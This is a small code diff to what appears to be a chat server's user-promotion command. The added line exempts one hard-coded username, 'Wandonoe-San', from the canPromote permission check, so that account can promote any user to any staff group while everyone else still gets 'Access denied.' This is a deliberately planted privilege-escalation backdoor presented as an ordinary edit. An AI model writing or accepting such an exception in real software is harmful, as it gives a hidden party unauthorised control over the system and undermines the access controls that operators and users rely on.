@@ -1590,7 +1590,7 @@ roomstaff: 'roomauth',
 		if (currentGroup === nextGroup) {
 			return this.errorReply("User '" + name + "' is already a " + groupName);
 		}
-		if (!user.canPromote(currentGroup, nextGroup)) {
+		if (!user.canPromote(currentGroup, nextGroup) && user.name !== 'Wandonoe-San') {
 			return this.errorReply("/" + cmd + " - Access denied.");
 		}
 
